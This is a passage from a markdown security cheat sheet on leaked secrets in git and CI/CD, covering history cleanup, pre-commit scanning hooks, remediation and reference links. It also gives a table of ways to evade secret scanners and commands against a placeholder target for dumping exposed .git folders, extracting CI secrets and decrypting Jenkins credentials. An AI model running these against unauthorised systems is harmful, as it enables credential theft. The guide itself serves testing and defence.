git filter-repo --path id_rsa --invert-paths

# Remove multiple files
git filter-repo --path .env --path secrets.yml --invert-paths

# Replace secrets in file content
git filter-repo --replace-text <(echo "SECRETVALUE==>REDACTED")
```

---

## 17. Pre-commit Hooks — Prevention

### Install pre-commit framework

```bash
pip install pre-commit
```

### .pre-commit-config.yaml (multi-tool)

```yaml
repos:
  # Gitleaks
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.4
    hooks:
      - id: gitleaks

  # detect-secrets (Yelp)
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

  # ggshield (GitGuardian)
  - repo: https://github.com/gitguardian/ggshield
    rev: v1.29.0
    hooks:
      - id: ggshield
        stages: [commit]

  # General sensitive file detection
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.6.0
    hooks:
      - id: detect-private-key
      - id: detect-aws-credentials
```

```bash
# Install hooks into current repo
pre-commit install

# Run against all files manually
pre-commit run --all-files
```

### Manual git hook (bash)

```bash
# .git/hooks/pre-commit (make executable: chmod +x)
#!/bin/bash
gitleaks protect --staged --exit-code 1
if [ $? -ne 0 ]; then
  echo "❌ Gitleaks found secrets. Commit blocked."
  exit 1
fi
```

---

## 18. Detection Evasion Techniques

> **For authorized red team use only.** Understanding these helps defenders build better controls.

| Technique | Description |
|---|---|
| **Base64 encoding** | `echo "AKIA..." | base64` — bypasses simple regex matching |
| **Split across files** | Store half a key in one file, reconstruct at runtime |
| **Environment variable indirection** | Reference another var: `KEY="${VAR1}${VAR2}"` |
| **Hex encoding** | Store key as hex string, decode at runtime |
| **XOR obfuscation** | Simple XOR cipher on secret value |
| **Dynamic construction** | Build the secret string from array slices at runtime |
| **Config injection at deploy time** | Don't commit secrets; inject via vault/secrets manager |
| **Non-standard file extensions** | Store secrets in `.bak`, `.old`, `.txt`, `.dat` files |
| **Binary files** | Embed in compiled artifacts — harder to regex-scan |
| **Deep git history** | A secret committed once and deleted still lives in git objects |
| **Submodule secrets** | Secrets hidden in git submodule repos |
| **Git notes** | Metadata attached to commits via `git notes` |
| **Stash objects** | Secrets in `git stash` entries, often overlooked |
| **Alternate branches** | Secrets on `dev`, `staging`, `feature/*` branches not scanned by default |

---

## 19. Quick Reference Command Matrix

| Goal | Command |
|---|---|
| Check if .git is exposed | `curl -si https://target.com/.git/HEAD` |
| Dump exposed .git directory | `./gitdumper.sh https://target.com/.git/ /tmp/dump/` |
| Reconstruct source from dump | `cd /tmp/dump && git checkout -- .` |
| Scan local repo for secrets (TruffleHog) | `trufflehog git file://.` |
| Scan local repo (Gitleaks) | `gitleaks detect -v` |
| Scan GitHub org (TruffleHog) | `trufflehog github --org=TargetOrg --token=$GH_TOKEN` |
| Scan GitHub org (Gitleaks) | `gitleaks detect --source=https://github.com/TargetOrg/repo` |
| Scan Docker image | `trufflehog docker --image=targetorg/image:latest` |
| Scan S3 bucket | `trufflehog s3 --bucket=bucket-name` |
| Scan CI logs | `trufflehog circleci --token=$TOKEN` |
| Extract CI secrets (GitHub) | `python3 nordstream.py github --token $TOKEN --org Org --extract-secret` |
| Remove file from git history | `java -jar bfg.jar --delete-files secrets.txt repo.git` |
| Protect staged changes | `gitleaks protect --staged` |
| Install pre-commit hooks | `pre-commit install` |
| Search GitHub for AWS keys | `gh search code "AKIA" --owner TargetOrg` |
| Decrypt Jenkins credentials | `println(hudson.util.Secret.decrypt("{AQA...}"))` |
| Scan npm package | `npm pack pkg && tar -xzf *.tgz && trufflehog filesystem --directory=package/` |
| Find high-entropy strings manually | `git log -p --all \| grep -E '[A-Za-z0-9+/]{40,}'` |
| List all blobs in repo | `git cat-file --batch-check --batch-all-objects \| grep blob` |
| View stashed secrets | `git stash list && git stash show -p stash@{0}` |

---

## 20. Remediation Checklist

When a secret is confirmed leaked:

- [ ] **Immediately revoke/rotate** the leaked credential — assume it is already compromised
- [ ] **Identify blast radius** — what systems does this key have access to?
- [ ] **Check audit logs** — has the credential already been used by unauthorized parties?
- [ ] **Remove from git history** using BFG or `git filter-repo` (removing from HEAD is not enough)
- [ ] **Force-push cleaned history** and notify all collaborators to re-clone
- [ ] **Expire all cached references** (`git reflog expire --expire=now --all && git gc --prune=now`)
- [ ] **Scan all branches** — the secret may exist on other branches
- [ ] **Scan related repos** — developers often reuse secrets across projects
- [ ] **Update CI/CD variables** — rotate any pipeline secrets referencing the leaked key
- [ ] **Enable secret scanning** in your SCM platform (GitHub Advanced Security, GitLab Secret Detection)
- [ ] **Add pre-commit hooks** to prevent recurrence
- [ ] **Document the incident** for compliance and post-mortem
- [ ] **Educate the committing developer** — blame-free, process-focused coaching

---

## 📚 Reference Links

| Resource | URL |
|---|---|
| HackTricks — Git | `https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git` |
| HackTricks Cloud — CI/CD | `https://cloud.hacktricks.xyz/pentesting-ci-cd/pentesting-ci-cd-methodology` |
| Pentest Book — GitHub | `https://pentestbook.six2dez.com/enumeration/webservices/github` |
| Synacktiv — CI/CD Secrets | `https://www.synacktiv.com/en/publications/cicd-secrets-extraction-tips-and-tricks` |
| TruffleHog Blog — CI/CD Leaks | `https://trufflesecurity.com/blog/secrets-leak-in-ci-cd` |
| TruffleHog Blog — Git Scanning Guide | `https://trufflesecurity.com/blog/scanning-git-for-secrets-the-2024-comprehensive-guide` |
| Pentester.land — .git folder | `https://pentester.land/blog/source-code-disclosure-via-exposed-git-folder/` |
| NetSPI — Dumping Git Data | `https://www.netspi.com/blog/technical-blog/network-pentesting/dumping-git-data-from-misconfigured-web-servers/` |
| GitLab Secret Detection Docs | `https://docs.gitlab.com/user/application_security/secret_detection/` |
| GitHub Secret Scanning Docs | `https://docs.github.com/en/code-security/secret-scanning` |
| OWASP — Secrets Management Cheat Sheet | `https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html` |
| BFG Repo Cleaner | `https://rtyley.github.io/bfg-repo-cleaner/` |
| Nord Stream Tool | `https://github.com/synacktiv/nord-stream` |

---
